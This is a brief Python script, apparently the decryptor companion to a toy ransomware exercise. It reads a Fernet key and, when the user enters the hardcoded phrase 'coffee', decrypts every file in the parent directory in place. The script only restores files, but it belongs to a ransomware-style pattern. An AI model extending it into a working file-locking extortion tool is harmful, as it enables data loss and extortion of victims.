#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#let's find some files

files=[]

for file in os.listdir(".."):
  if os.path.isfile("../" + file):
    files.append("../" + file)

with open("thekey.key", "rb") as thekey:
  secretkey = thekey.read()

secretphrase = "coffee"
user_phrase = input("Enter the secret phrase to decrypt your files: ")

if user_phrase == secretphrase:
  for file in files:
    with open(file, "rb") as thefile:
      content = thefile.read()
    content_decrypted = Fernet(secretkey).decrypt(content)
    with open(file, "wb") as thefile:
      thefile.write(content_decrypted)  
  print("Congrats, your files are decrypted!")
else:
  print("Files not decrypted, wrong password.")
